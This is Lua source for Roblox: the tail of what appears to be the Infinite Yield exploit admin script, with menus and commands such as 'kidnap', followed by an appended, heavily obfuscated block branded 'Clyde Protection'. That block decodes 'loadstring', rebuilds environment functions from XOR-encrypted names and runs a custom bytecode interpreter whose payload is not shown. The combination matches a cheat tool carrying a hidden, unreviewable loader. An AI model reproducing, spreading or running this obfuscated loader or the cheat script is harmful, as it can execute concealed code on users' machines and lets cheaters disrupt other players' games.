	local Index,SizeY = 0,0
	for i,v in next, frame2:GetChildren() do
		if bool then
			if Match2(v.Text,str) then
				game.CoreGui.sugg.suggestions:TweenSize(UDim2.new(0, 300, 0, 200),"Out","Quad",0.3,true)
				Index = Index + 1
				v.Position = UDim2.new(0,0,0,Index*v.AbsoluteSize.Y-v.AbsoluteSize.Y)
				v.Visible = true
				SizeY = SizeY + v.AbsoluteSize.Y
				frame2.CanvasSize = UDim2.new(0,0,0,SizeY) else v.Visible = false end else
			v.Visible = true
			SizeY = SizeY + v.AbsoluteSize.Y
			frame2.CanvasSize = UDim2.new(0,0,0,SizeY) end end end end end
IndexContents2('',true)
game.CoreGui.sugg.suggestions:TweenSize(UDim2.new(0, 300, 0, 0),"Out","Quad",0.2,true)
Loading.ba:TweenSize(UDim2.new(1, 0, 1, 0), "InOut", "Quart", 0.4, true, nil) wait(1)
repeat wait() until loadedintro == true
logof:TweenSizeAndPosition(UDim2.new(0,0,0,0),UDim2.new(0.5,0,0.5,0), "Out", "Linear", 0.1)
wait(0.2)
f:TweenSizeAndPosition(UDim2.new(0,0,0,0),UDim2.new(0.5,0,0.5,0), "Out", "Linear", 0.2)
wait(0.3) g:Destroy()
updatecolors(Color3.new(colorR, colorG, colorB))
Loading:TweenPosition(UDim2.new(0.25, 0, 1.5, 0), "InOut", "Quart", 0.5, true, nil) wait(0.5) Loading.Parent:Destroy()
coroutine.resume(coroutine.create(function()
	local TextChatService = game:GetService("TextChatService")
	print("[IY-DEBUG] ChatVersion =", TextChatService.ChatVersion)
	if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
		local channels = TextChatService:FindFirstChild("TextChannels")
		local channel = channels and channels:FindFirstChild("RBXGeneral")
		print("[IY-DEBUG] channel =", channel)
		if channel then
			channel:DisplaySystemMessage("The prefix is '" .. cmdprefix .. "'")
			task.wait(0.5)
			channel:DisplaySystemMessage("Click IY on the top left to see more options")
			print("[IY-DEBUG] messages sent")
		end
	else
		game.StarterGui:SetCore("ChatMakeSystemMessage", {
			Text = "The prefix is '" .. cmdprefix .. "'";
			Color = Color3.new(255,255,255);
			Font = Enum.Font.SourceSans;
			FontSize = Enum.FontSize.Size24;
		}) wait(0.5)
		game.StarterGui:SetCore("ChatMakeSystemMessage", {
			Text = "Click IY on the top left to see more options";
			Color = Color3.new(255,255,255);
			Font = Enum.Font.SourceSans;
			FontSize = Enum.FontSize.Size24;
		})
	end
end))
quickmenu.sheild.cmds:TweenPosition(UDim2.new(0, 50, 0, -100), "InOut", "Quart", 0.5, true, nil) wait(0.01)
quickmenu.sheild.settings:TweenPosition(UDim2.new(0, 146, 0, -100), "InOut", "Quart", 0.5, true, nil) wait(0.01)
quickmenu.sheild.updates:TweenPosition(UDim2.new(0, 220, 0, -100), "InOut", "Quart", 0.5, true, nil) wait(0.01)
quickmenu.sheild.info:TweenPosition(UDim2.new(0, 290, 0, -100), "InOut", "Quart", 0.5, true, nil) wait(0.01)
quickmenu.sheild.mix:TweenPosition(UDim2.new(0, 340, 0, -100), "InOut", "Quart", 0.5, true, nil) wait(0.01)
qopen = false quickmenu.MouseButton1Click:connect(function()
if qopen == false then fadelock('off') NOTIFY.NOTIFY:TweenPosition(UDim2.new(0,0,0,-100), "InOut", "Quart", 0.5, true, nil)
quickmenu.sheild.cmds:TweenPosition(UDim2.new(0, 50, 0, 0), "InOut", "Quart", 0.5, true, nil) wait(0.01)
quickmenu.sheild.settings:TweenPosition(UDim2.new(0, 146, 0, 0), "InOut", "Quart", 0.5, true, nil) wait(0.01)
quickmenu.sheild.updates:TweenPosition(UDim2.new(0, 220, 0, 0), "InOut", "Quart", 0.5, true, nil) wait(0.01)
quickmenu.sheild.mix:TweenPosition(UDim2.new(0, 340, 0, 0), "InOut", "Quart", 0.5, true, nil) wait(0.01) MusicPlayer:Hide()
quickmenu.sheild.info:TweenPosition(UDim2.new(0, 290, 0, 0), "InOut", "Quart", 0.5, true, nil) wait(0.01)
quickmenu.sheild.mix:TweenPosition(UDim2.new(0, 340, 0, 0), "InOut", "Quart", 0.5, true, nil) wait(0.01) qopen = true else
quickmenu.sheild.cmds:TweenPosition(UDim2.new(0, 50, 0, -100), "InOut", "Quart", 0.5, true, nil) wait(0.01)
quickmenu.sheild.settings:TweenPosition(UDim2.new(0, 146, 0, -100), "InOut", "Quart", 0.5, true, nil) wait(0.01)
quickmenu.sheild.updates:TweenPosition(UDim2.new(0, 220, 0, -100), "InOut", "Quart", 0.5, true, nil) wait(0.01)
quickmenu.sheild.info:TweenPosition(UDim2.new(0, 290, 0, -100), "InOut", "Quart", 0.5, true, nil) wait(0.01)
quickmenu.sheild.mix:TweenPosition(UDim2.new(0, 340, 0, -100), "InOut", "Quart", 0.5, true, nil) wait(0.01)
if slock == true then fadelock("rbxassetid://1495252742") elseif isagelocked == true then fadelock("rbxassetid://1495252495") end
qopen = false if playerenabled == true then MusicPlayer:Show() else NOTIFY.NOTIFY:TweenPosition(UDim2.new(0, 0, 0, -38), "InOut", "Quart", 0.5, true, nil) end end end)
quickmenu.sheild.cmds.MouseButton1Click:connect(function() if cmdOpen == true then
game.CoreGui.cp.Frame.holder.FeedbackMain:TweenPosition(UDim2.new(1.02,0,1.018,-310),"Out","Quad",0.2,true) wait(0.1)
game.CoreGui.cp.Frame.holder.size:TweenPosition(UDim2.new(1,-301,1,-300),"Out","Quad",0.2,true) wait(0.2)
game.CoreGui.cp.Frame.holder.bar.Hide.Visible = true
game.CoreGui.cp.Frame.holder.bar.Hide:TweenSize(UDim2.new(0,20,0,20),"Out","Quad",0.2,true)
else runwindow() end end)
quickmenu.sheild.settings.MouseButton1Click:connect(function() hub() end)
infopen = false quickmenu.sheild.info.MouseButton1Click:connect(function() if infopen == false then infopen = true
Updates = Instance.new("ScreenGui")
dragg = Instance.new("Frame")
local PromptDialog = Instance.new("Frame")
local ContainerFrame = Instance.new("Frame")
local LOG = Instance.new("TextLabel")
local PopupText3 = Instance.new("TextLabel")
local PopupText4 = Instance.new("TextLabel")
local UTDV = Instance.new("TextLabel")
local PopupText5 = Instance.new("TextLabel")
local shadow = Instance.new("Frame")
Exitt = Instance.new("TextButton")
local PopupText = Instance.new("TextLabel")
local vers = Instance.new("TextLabel")
Updates.Name = "Updates"
Updates.Parent = game.CoreGui
dragg.Name = "drag"
dragg.Parent = Updates
dragg.Active = true
dragg.BackgroundColor3 = Color3.new(1, 1, 1)
dragg.BackgroundTransparency = 1
dragGUI(dragg)
dragg.Position = UDim2.new(0.5, -225, 0, -600)
dragg.Size = UDim2.new(0, 438, 0, 26)
PromptDialog.Name = "PromptDialog"
PromptDialog.Parent = dragg
PromptDialog.BackgroundColor3 = Color3.new(0, 0, 0)
PromptDialog.BackgroundTransparency = 1
PromptDialog.BorderSizePixel = 0
PromptDialog.Position = UDim2.new(0, 0, 0, -2)
PromptDialog.Size = UDim2.new(0, 438, 0, 300)
PromptDialog.ZIndex = 5
ContainerFrame.Name = "ContainerFrame"
ContainerFrame.Parent = PromptDialog
ContainerFrame.BackgroundColor3 = maincolor
ContainerFrame.BackgroundTransparency = 0.5
ContainerFrame.BorderColor3 = Color3.new(0, 0, 0)
ContainerFrame.BorderSizePixel = 0
ContainerFrame.Position = UDim2.new(0, 0, 0, 29)
ContainerFrame.Size = UDim2.new(1, 0, 0.8, 0) -- SIZE
ContainerFrame.ZIndex = 5
LOG.Name = "LOG"
LOG.Parent = ContainerFrame
LOG.BackgroundTransparency = 1
LOG.Position = UDim2.new(0, 8, 0, 110)
LOG.Size = UDim2.new(1, -16, 1, 0)
LOG.ZIndex = 10
LOG.Font = Enum.Font.SourceSansBold
LOG.TextSize = 20
LOG.Text = "+ Added os [plr]\n+ Added whiteify/blackify [plr]\n+ Added addban [full username]\n+ Added a rainbow mode to the UI (inside color picker)\n\n* Fixed a bug in kidnap"
LOG.TextColor3 = Color3.new(0.97, 0.97, 0.97)
LOG.TextStrokeTransparency = 0
LOG.TextWrapped = true
LOG.TextYAlignment = Enum.TextYAlignment.Top
LOG.TextXAlignment = "Left"
PopupText3.Name = "PopupText3"
PopupText3.Parent = ContainerFrame
PopupText3.BackgroundTransparency = 1
PopupText3.Position = UDim2.new(0, 8, 0, 35)
PopupText3.Size = UDim2.new(1, -16, 0.100000001, 0)
PopupText3.ZIndex = 10
PopupText3.Font = Enum.Font.SourceSansBold
PopupText3.TextSize = 20
PopupText3.Text = "Edge - Moon"
PopupText3.TextColor3 = Color3.new(0.97, 0.97, 0.97)
PopupText3.TextStrokeTransparency = 0
PopupText3.TextWrapped = true
PopupText3.TextYAlignment = Enum.TextYAlignment.Top
PopupText4.Name = "PopupText4"
PopupText4.Parent = ContainerFrame
PopupText4.BackgroundTransparency = 1
PopupText4.Position = UDim2.new(0, 8, 0, 50)
PopupText4.Size = UDim2.new(1, -16, 0.100000001, 0)
PopupText4.ZIndex = 10
PopupText4.Font = Enum.Font.SourceSansBold
PopupText4.FontSize = Enum.FontSize.Size18
PopupText4.Text = "infyield.weebly.com - discord.me/infiniteyield"
PopupText4.TextColor3 = Color3.new(0.97, 0.97, 0.97)
PopupText4.TextStrokeTransparency = 0
PopupText4.TextWrapped = true
PopupText4.TextYAlignment = Enum.TextYAlignment.Top
UTDV.Name = "UTDV"
UTDV.Parent = ContainerFrame
UTDV.BackgroundTransparency = 1
UTDV.Position = UDim2.new(0, 8, 0, 5)
UTDV.Size = UDim2.new(1, -16, 0.100000001, 0)
UTDV.ZIndex = 10
UTDV.Font = Enum.Font.SourceSansBold
UTDV.FontSize = Enum.FontSize.Size28
UTDV.Text = "Up to date version: N/A"
UTDV.TextColor3 = Color3.new(0.97, 0.97, 0.97)
UTDV.TextStrokeTransparency = 0
UTDV.TextWrapped = true
UTDV.TextYAlignment = Enum.TextYAlignment.Top
PopupText5.Name = "PopupText5"
PopupText5.Parent = ContainerFrame
PopupText5.BackgroundTransparency = 1
PopupText5.Position = UDim2.new(0, 8, 0, 75)
PopupText5.Size = UDim2.new(1, -16, 0.100000001, 0)
PopupText5.ZIndex = 10
PopupText5.Font = Enum.Font.SourceSansBold
PopupText5.FontSize = Enum.FontSize.Size28
PopupText5.Text = "Update Log:"
PopupText5.TextColor3 = Color3.new(0.97, 0.97, 0.97)
PopupText5.TextStrokeTransparency = 0
PopupText5.TextWrapped = true
PopupText5.TextYAlignment = Enum.TextYAlignment.Top
shadow.Name = "shadow"
shadow.Parent = PromptDialog
shadow.BackgroundColor3 = maincolor
shadow.BackgroundTransparency = 0.30000001192093
shadow.BorderColor3 = Color3.new(0, 0, 0)
shadow.BorderSizePixel = 0
shadow.Position = UDim2.new(0, 0, 0.00999999978, 0)
shadow.Size = UDim2.new(0, 438, 0, 26)
Exitt.Name = "Exit"
Exitt.Parent = shadow
Exitt.BackgroundColor3 = Color3.new(1, 0, 0)
Exitt.BackgroundTransparency = 0.30000001192093
Exitt.BorderColor3 = Color3.new(1, 0, 0)
Exitt.BorderSizePixel = 0
Exitt.Position = UDim2.new(0, 415, 0, 3)
Exitt.Size = UDim2.new(0, 20, 0, 20)
Exitt.FontSize = Enum.FontSize.Size14
Exitt.Text = ""
PopupText.Name = "PopupText"
PopupText.Parent = shadow
PopupText.BackgroundTransparency = 1
PopupText.Position = UDim2.new(0, 61, 0, -2)
PopupText.Size = UDim2.new(0.760273993, -16, 1.15384614, 0)
PopupText.ZIndex = 110
PopupText.Font = Enum.Font.SourceSansBold
PopupText.TextSize = 30
PopupText.Text = "Information"
PopupText.TextColor3 = Color3.new(0.97, 0.97, 0.97)
PopupText.TextStrokeTransparency = 0
PopupText.TextWrapped = true
PopupText.TextYAlignment = Enum.TextYAlignment.Top
vers.Name = "vers"
vers.Parent = shadow
vers.BackgroundTransparency = 1
vers.Position = UDim2.new(0, 8, 0, 2)
vers.Size = UDim2.new(0.200913236, -16, 1.11538458, 0)
vers.ZIndex = 110
vers.Font = Enum.Font.SourceSansBold
vers.TextSize = 20
vers.Text = "v" .. Version
vers.TextColor3 = Color3.new(0.97, 0.97, 0.97)
vers.TextStrokeTransparency = 0
vers.TextWrapped = true
vers.TextXAlignment = Enum.TextXAlignment.Left
vers.TextYAlignment = Enum.TextYAlignment.Top
if UTD == true then UTDV.Text = "Up to date version: Yes" else UTDV.Text = "Up to date version: No" end end
dragg:TweenPosition(UDim2.new(0.5, -225, 0, 100), "InOut", "Quart", 0.5, true, nil) Exitt.MouseButton1Click:connect(function()
dragg:TweenPosition(UDim2.new(0.5, -225, 0, -600), "InOut", "Quart", 0.5, true, nil) wait(0.5) infopen = false Updates:Destroy() end) end)
quickmenu.sheild.updates.MouseButton1Click:connect(function() serverinfogui() end) end

run()
--script end
end

run()
print("fixed by BLOX_FRUIT01110")
--start
--[[
   ___ _         _       ___         _          _   _           __   ___ 
  / __| |_  _ __| |___  | _ \_ _ ___| |_ ___ __| |_(_)___ _ _   \ \ / / |  
 | (__| | || / _` / -_) |  _/ '_/ _ \  _/ -_) _|  _| / _ \ ' \   \ V /| | 
  \___|_|\_, \__,_\___| |_| |_| \___/\__\___\__|\__|_\___/_||_|   \_/ |_|    
         |__/    
 
  https://clydeprotectionde.cloud 
  build 4D0BB8CD  
]]
local _10I12=("")["\99\104\097\114"]
local __001d=(function() local __11e=""
for _,_c in ipairs({46,49,35,38,53,54,52,43,48,41}) do __11e=__11e.._10I12((_c-194+256)%256) end
local _f=(type(getfenv)=="function" and getfenv(0) or _G)[__11e]
if _f then return _f end
__11e=""
for _,_c in ipairs({46,49,35,38}) do __11e=__11e.._10I12((_c-194+256)%256) end
return (type(getfenv)=="function" and getfenv(0) or _G)[__11e] end)()
local _lII1c=__001d
local function _lO0_1f(_IO1g,_1_1h) local _n=""
for _i=1,#_IO1g do _n=_n.._10I12((_IO1g[_i]-_1_1h+256)%256) end
return __001d("\114\101\116\117\114\110\32".._n)() end
local _l101b=_lO0_1f({5,244,10,6,248,7},147)
do local _001j=_lO0_1f({21,28,39,230,229},179)
_O0I14=_001j["\098\097\110\100"] end
do local ___1k=_lO0_1f({201,208,219,154,153},103)
_lOI15=___1k["\114\115\104\105\102\116"] end
do local _l11l=_lO0_1f({113,94,95,105,98},253)
_01O16=_l11l["\99\111\110\99\097\116"] end
local _0OO17=_lO0_1f({246,233,231,242,242},134)
local __I11a=_lO0_1f({226,209,231,215,213,228},112)
do local __O1i=_lO0_1f({25,32,43,234,233},183)
_1Ol13=__O1i["\098\120\111\114"] end
local __OI18=_lO0_1f({191,196,187,176},75)
local _10I19=_lO0_1f({130,116,131,124,116,131,112,131,112,113,123,116},15)
local function _OII01n(_l_1m) local _0O1o=304532477
local _O11p={}
for _I01q=1,#_l_1m do local _111r=_O0I14(_0O1o,0xFF)
_O11p[_I01q]=_10I12(_1Ol13(_l_1m[_I01q],_111r))
if _0O1o%2==0 then _0O1o=_lOI15(_0O1o,1) else _0O1o=_O0I14(_0O1o*3+1,0x7FFFFFFF) end
if _0O1o<=1 then _0O1o=_1Ol13(304532477,_I01q) end end
return _01O16(_O11p) end
local function _0I0I1u() local _01l1t
local _f=_lII1c(_OII01n({143,157,136,139,13,16,159,89,122,42,72,235,41,160,195,235}))
if _f then local _o,_r=_0OO17(_f)
if _o and __OI18(_r)=="\116\97\098\108\101" then return _r end end
_f=_lII1c(_OII01n({143,157,136,139,13,16,159,89,122,42,73,235,41,160,195,242,72}))
if _f then local _o,_r=_0OO17(_f)
if _o and __OI18(_r)=="\116\97\098\108\101" then return _r end end
return _G end
local _1IOI2=_0I0I1u()
local _l1II1z={["\095\95\105\110\100\101\120"]=function(_l11v,_II1w) local _I_1x,_O11y=_0OO17(function() return _1IOI2[_II1w] end)
return _I_1x and _O11y or nil end}
local _0IlO1=_10I19({},_l1II1z)
local __I_l3={{145,151,157,154,25,23,211,91},{142,157,136,144,30,19,218,93,126,50,67,227,34,162,131,173,5},{154,157,136,140,26,16,201},{148,139,144,157,19,17,204,75,109,59},{142,140,142,151,17,25},{169,143,153,155,17,55,209,88,112},{154,157,136,146,16,31,219,91,123,51,64,234,50,186,142,177},{137,153,158,146,26},{142,136,157,137,17},{168,188,149,147,77},{133,136,159,159,19,18},{153,157,144,152,22,18,218},{138,153,142,144},{154,157,136,138,23,12,218,95,123,55,75,235,41,162,130,182,24},{144,153,136,150},{190,151,144,145,13,77},{154,157,136,152,26,16,201},{138,138,149,138,26,24,214,82,122},{143,157,141,139,26,13,203},{168,188,149,147},{154,157,136,153,28},{191,138,149,157,20,61,208,82,112,44},{158,151,142,145,10,10,214,80,122},{158,138,133,142,11},{179,141,145,156,26,12,236,91,110,43,74,224,36,179},{147,157,139,157,28,18,208,77,106,44,74},{155,145,142,155,12,23,216,80,126,50},{154,157,136,140,10,16,209,87,113,57,92,237,53,191,155,182,18},{148,136,157,151,13,13},{142,157,136,152,26,16,201},{136,140,154,198},{141,153,149,140,12},{154,157,136,157,30,18,211,87,113,57,92,237,53,191,155,182},{149,151,147,149,25,11,209,93,107,55,64,224},{137,129,140,155,16,24},{142,157,136,147,26,10,222,74,126,60,67,235},{137,145,145,155},{137,145,159,149},{142,155,142,151,15,10},{143,153,139,153,26,10},{175,157,159,138},{143,157,141,139,22,12,218},{137,151,143,138,13,23,209,89},{139,157,142,141,22,17,209},{142,157,136,140,26,31,219,81,113,50,86},{171,157,159,138,16,12,140},{171,157,159,138,16,12,141},{154,153,145,155},{148,139,154,151,19,27},{149,140,136,142},{179,141,145,156,26,12,237,95,113,57,74},{145,145,143,138,25,23,211,91,108},{185,153,136,155,43,23,210,91},{152,138,142,145,13},{147,157,132,138},{154,157,136,157,16,16,209,91,124,42,70,225,41,165},{162,191},{180,150,143,138,30,16,220,91},{159,141,154,152,26,12},{158,144,153,157,20,29,222,82,115,59,93},{159,145,136,205,77},{175,157,155,151,16,16,140},{148,139,154,145,19,26,218,76},{141,155,157,146,19},{147,157,139,142,13,17,199,71},{140,141,153,139,26,33,208,80,64,42,74,226,34,166,132,176,21},{168,139,153,140,44,27,203,74,118,48,72,253},{142,157,136,140,30,9,210,91,107,63,91,239,37,186,142},{154,157,136,141,26,16,201},{142,144,157,140,26,26},{144,153,151,155,25,17,211,90,122,44},{190,151,144,145,13,45,218,79,106,59,65,237,34},{142,157,136,138,23,12,218,95,123,55,75,235,41,162,130,182,24},{156,139,143,155,13,10},{154,157,136,151,17,13,203,95,113,61,74,253},{154,157,136,144,22,18,214,80,108,42,78,224,36,179,152},{146,139},{154,157,136,153,26,16,201},{136,150,140,159,28,21},{153,157,144,152,16,18,219,91,109},{175,153,146,154,16,19},{137,129,140,155},{142,129,146},{154,157,136,141,28,12,214,78,107,45},{148,139,142,155,30,26,208,80,115,39},{143,153,139,155,14,11,222,82},{142,140,157,138,12},{142,157,144,155,28,10},{153,157,158,139,24},{159,153,143,155,73,74},{145,151,157,154},{158,148,147,144,26,12,218,88},{153,157,144,159,6},{142,157,136,157,19,23,207,92,112,63,93,234},{137,151,146,139,18,28,218,76},{143,153,139,146,26,16},{148,139,159,157,19,17,204,75,109,59},{156,136,140,155,17,26,217,87,115,59},{143,157,157,154,25,23,211,91},{137,153,143,149},{175,153,133,157,30,13,203,110,126,44,78,227,52},{184,150,137,147},{138,153,149,138},{175,153,133},{154,157,136,140,30,9,210,91,107,63,91,239,37,186,142},{149,151,147,149,18,27,203,95,114,59,91,230,40,178},{178,142,153,140,19,31,207,110,126,44,78,227,52},{143,153,139,141,26,10},{141,138,149,144,11},{190,190,142,159,18,27},{145,151,157,154,12,10,205,87,113,57},{142,157,136,138,22,16,216,77},{154,157,136,144,30,19,218,93,126,50,67,227,34,162,131,173,5},{185,138,157,137,22,16,216},{154,157,136,147,26,10,222,74,126,60,67,235},{138,151,142,149,12,14,222,93,122},{148,156,153,144,11,23,217,71,122,38,74,237,50,162,132,176}}
for ___04=1,#__I_l3 do local _1I15=_OII01n(__I_l3[___04])
local _I_1x,_O11y=_0OO17(function() return _1IOI2[_1I15] end)
if _I_1x then _l101b(_0IlO1,_1I15,_O11y) end end
if not __I11a(_0IlO1,_OII01n({136,150,140,159,28,21})) then local _t=__I11a(_0IlO1,_OII01n({137,153,158,146,26}))
if _t then _l101b(_0IlO1,_OII01n({136,150,140,159,28,21}),_t[_OII01n({136,150,140,159,28,21})]) end end
if not __I11a(_0IlO1,_OII01n({145,151,157,154,12,10,205,87,113,57})) then _l101b(_0IlO1,_OII01n({145,151,157,154,12,10,205,87,113,57}),__I11a(_0IlO1,_OII01n({145,151,157,154}))) end

local function _IO_OI0(_0016,_I_I_7,_0IlO1,_I1l18,__OIl1y,__01IIe,_I__1f)
_I1l18=_I1l18 or {}
__01IIe=__01IIe or {}
_I__1f=_I__1f or {}
local _I0lIIg=_I__1f.n or #_I__1f
local function _O1OO0z(_idx) return _0016[_idx] end
for _i,_v in ipairs(_0016) do if type(_v)=="table" then local _s=""
if type(_v[1])=="table" then local _p=0
for _fi=1,#_v do for _j=1,#_v[_fi] do _s=_s..string.char(bit32.bxor(_v[_fi][_j],bit32.band(32+_p*75+(_i-1),0xFF)))
_p=_p+1 end end else for _j=1,#_v do _s=_s..string.char(bit32.bxor(_v[_j],bit32.band(32+(_j-1)*75+(_i-1),0xFF))) end end
_0016[_i]=_s end end
local function _1_1l020(ps) for _,p in ipairs(ps) do if p.K then for _i,_v in ipairs(p.K) do if type(_v)=="table" then local _s=""
if type(_v[1])=="table" then local _p=0
for _fi=1,#_v do for _j=1,#_v[_fi] do _s=_s..string.char(bit32.bxor(_v[_fi][_j],bit32.band(32+_p*75+(_i-1),0xFF)))
_p=_p+1 end end else for _j=1,#_v do _s=_s..string.char(bit32.bxor(_v[_j],bit32.band(32+(_j-1)*75+(_i-1),0xFF))) end end
p.K[_i]=_s end end end
if p.P then _1_1l020(p.P) end end end
_1_1l020(_I1l18)
if not _I_I_7[0] then for _i=1,#_I_I_7 do if _I_I_7[_i]>=0 then _I_I_7[_i]=bit32.bxor(_I_I_7[_i],122) end end
_I_I_7[0]=true end
local function _O_l0O21(ps) for _,p in ipairs(ps) do if p.C and not p.C[0] then for _i=1,#p.C do if p.C[_i]>=0 then p.C[_i]=bit32.bxor(p.C[_i],122) end end
p.C[0]=true end
if p.P then _O_l0O21(p.P) end end end
_O_l0O21(_I1l18)
local __0_O9={}
local _II10b={}
local _00_Ilh={}
local _IlO1a=0
local _0_0O1c={}
local _10_d=1
local _IO_10i=0
local _00_0k=false
local __00_Ol=false
local _1O0_m=0
local _I0_ln=0
local _1_Oo=0
local _O_llp=nil
local __ll10=0
if __OIl1y then for _k=0,(__OIl1y.n or 0)-1 do _II10b[_k]=__OIl1y[_k] end end
local function _IOOt(v) _IlO1a=_IlO1a+1
__0_O9[_IlO1a]=v end
local function _IOlu() local v=__0_O9[_IlO1a]
__0_O9[_IlO1a]=nil
_IlO1a=_IlO1a-1
return v end
local function _l0lv() return __0_O9[_IlO1a] end
local function _lOI00q(slot) local box=_0_0O1c[slot]
if box then return box[1] end
return _II10b[slot] end
local function _IOl_lr(slot,val) local box=_0_0O1c[slot]
if box then box[1]=val else _II10b[slot]=val end end
local function _0IIIls(slot) if not _0_0O1c[slot] then _0_0O1c[slot]={_II10b[slot]} end
return _0_0O1c[slot] end
local function _0O1lw(obj,name) local ok,mt=pcall(getmetatable,obj)
if ok and mt and type(mt)=="table" then return rawget(mt,name) end
return nil end
local function _l_IIOx(a,b,op,name) if type(a)=="number" and type(b)=="number" then return op(a,b) end
local ok,r=pcall(op,a,b)
if ok then return r end
local mm=_0O1lw(a,name) or _0O1lw(b,name)
if mm then return mm(a,b) end
return op(a,b) end
local __l__j={}
__l__j[62]=function() end
__l__j[60]=function() _IOOt(nil) end
__l__j[0]=function() _IOOt(true) end
__l__j[11]=function() _IOOt(false) end
__l__j[18]=function() _IOOt(_O1OO0z(_I_I_7[_10_d]+1))
_10_d=_10_d+1 end
__l__j[16]=function() _IOOt(_lOI00q(_I_I_7[_10_d]))
_10_d=_10_d+1 end
__l__j[27]=function() _IOl_lr(_I_I_7[_10_d],_IOlu())
_10_d=_10_d+1 end
__l__j[12]=function() _IOOt(_0IlO1[_O1OO0z(_I_I_7[_10_d]+1)])
_10_d=_10_d+1 end
__l__j[63]=function() _0IlO1[_O1OO0z(_I_I_7[_10_d]+1)]=_IOlu()
_10_d=_10_d+1 end
__l__j[33]=function() local b,a=_IOlu(),_IOlu()
_IOOt(_l_IIOx(a,b,function(x,y) return x+y end,"__add")) end
__l__j[61]=function() local b,a=_IOlu(),_IOlu()
_IOOt(_l_IIOx(a,b,function(x,y) return x-y end,"__sub")) end
__l__j[51]=function() local b,a=_IOlu(),_IOlu()
_IOOt(_l_IIOx(a,b,function(x,y) return x*y end,"__mul")) end
__l__j[26]=function() local b,a=_IOlu(),_IOlu()
_IOOt(_l_IIOx(a,b,function(x,y) return x/y end,"__div")) end
__l__j[40]=function() local b,a=_IOlu(),_IOlu()
_IOOt(_l_IIOx(a,b,function(x,y) return x%y end,"__mod")) end
__l__j[25]=function() local b,a=_IOlu(),_IOlu()
_IOOt(_l_IIOx(a,b,function(x,y) return x^y end,"__pow")) end
__l__j[53]=function() local b,a=_IOlu(),_IOlu()
local ok,r=pcall(function() return a..b end)
if ok then _IOOt(r) else _IOOt(tostring(a)..tostring(b)) end end
__l__j[29]=function() local b,a=_IOlu(),_IOlu()
_IOOt(a==b) end
__l__j[1]=function() local b,a=_IOlu(),_IOlu()
_IOOt(a~=b) end
__l__j[31]=function() local b,a=_IOlu(),_IOlu()
_IOOt(a<b) end
__l__j[43]=function() local b,a=_IOlu(),_IOlu()
_IOOt(a<=b) end
__l__j[50]=function() local b,a=_IOlu(),_IOlu()
_IOOt(a>b) end
__l__j[7]=function() local b,a=_IOlu(),_IOlu()
_IOOt(a>=b) end
__l__j[55]=function() local b,a=_IOlu(),_IOlu()
_IOOt(a and b) end
__l__j[42]=function() local b,a=_IOlu(),_IOlu()
_IOOt(a or b) end
__l__j[38]=function() _IOOt(not _IOlu()) end
__l__j[2]=function() _IOOt(-_IOlu()) end
__l__j[24]=function() _IOOt(#_IOlu()) end
__l__j[48]=function() _IOOt({}) end
__l__j[41]=function() local k,t=_IOlu(),_IOlu()
_IOOt(t[k]) end
__l__j[49]=function() local v,k,t=_IOlu(),_IOlu(),_IOlu()
t[k]=v end
__l__j[67]=function() local n=_I_I_7[_10_d]
_10_d=_10_d+1
local args={}
for i=1,n do args[n-i+1]=_IOlu() end
local f=_IOlu()
if type(f)~="function" then local mm=_0O1lw(f,"__call")
if mm then table.insert(args,1,f)
n=n+1
f=mm else error("attempt to call a "..type(f).." value") end end
local r
if n==0 then r={f()} else r={f(table.unpack(args,1,n))} end
_IOOt(r[1]) end
__l__j[34]=function() local n=_I_I_7[_10_d]
_10_d=_10_d+1
_00_0k=true
if n==0 then _1_Oo=0 elseif n>0 then if n>_IlO1a then n=_IlO1a end
_1_Oo=n
__00_Ol=true
_I0_ln=_IlO1a
_1O0_m=_IlO1a-n else _1_Oo=_IlO1a
__00_Ol=true
_I0_ln=_IlO1a
_1O0_m=0 end end
__l__j[37]=function() _10_d=_I_I_7[_10_d]+1 end
__l__j[45]=function() local target=_I_I_7[_10_d]
_10_d=_10_d+1
if not _IOlu() then _10_d=target+1 end end
__l__j[65]=function() local n=_I_I_7[_10_d]
_10_d=_10_d+1
for _=1,n do _IOlu() end end
__l__j[56]=function() local pi=_I_I_7[_10_d]
_10_d=_10_d+1
local P=_I1l18[pi]
if P then
local _r,Kp,Cp=_IO_OI0,P.K or _0016,P.C or {}
local nU={}
if P.U then for ui,ud in ipairs(P.U) do local iL,idx=ud[1],ud[2]
if iL==1 then nU[ui]=_0IIIls(idx) else nU[ui]=__01IIe[idx+1] end end end
local nP=P.nParams or 0
_IOOt(function(...)
local a={...}
local ac=select("#",...)
local L={}
L.n=nP
for i=1,(ac<nP and ac or nP) do L[i-1]=a[i] end
local va={}
if ac>nP then for i=nP+1,ac do va[i-nP]=a[i] end end
va.n=ac-nP
return _r(Kp,Cp,_0IlO1,P.P or {},L,nU,va)
end)
else _IOOt(nil) end end
__l__j[17]=function() _IOOt(_l0lv()) end
__l__j[28]=function() local ui=_I_I_7[_10_d]
_10_d=_10_d+1
local box=__01IIe[ui+1]
_IOOt(box and box[1] or nil) end
__l__j[9]=function() local ui=_I_I_7[_10_d]
_10_d=_10_d+1
local box=__01IIe[ui+1]
if box then box[1]=_IOlu() else _IOlu() end end
__l__j[52]=function() local na=_I_I_7[_10_d]
_10_d=_10_d+1
local nr=_I_I_7[_10_d]
_10_d=_10_d+1
local args={}
for i=1,na do args[na-i+1]=_IOlu() end
local f=_IOlu()
if type(f)~="function" then local mm=_0O1lw(f,"__call")
if mm then table.insert(args,1,f)
na=na+1
f=mm else error("attempt to call a "..type(f).." value") end end
local r
if na==0 then r=table.pack(f()) else r=table.pack(f(table.unpack(args,1,na))) end
local rn=nr<0 and r.n or nr
for i=1,rn do _IOOt(r[i]) end end
__l__j[46]=function() local n=_I_I_7[_10_d]
_10_d=_10_d+1
if n<0 then for i=1,_I0lIIg do _IOOt(_I__1f[i]) end else for i=1,n do _IOOt(_I__1f[i]) end end end
__l__j[5]=function() local n=_I_I_7[_10_d]
_10_d=_10_d+1
local args={}
for j=n,1,-1 do args[j]=_IOlu() end
local f=_IOlu()
if type(f)~="function" then local mm=_0O1lw(f,"__call")
if mm then table.insert(args,1,f)
n=n+1
f=mm end end
_00_0k=true
_O_llp=table.pack(f(table.unpack(args,1,n))) end
__l__j[6]=function() local off=_I_I_7[_10_d]
_10_d=_10_d+1
local step=_IOlu()
local limit=_IOlu()
local init=_IOlu()
_IOOt(init)
_IOOt(limit)
_IOOt(step)
if step>=0 then if init>limit then _10_d=off+1 end else if init<limit then _10_d=off+1 end end end
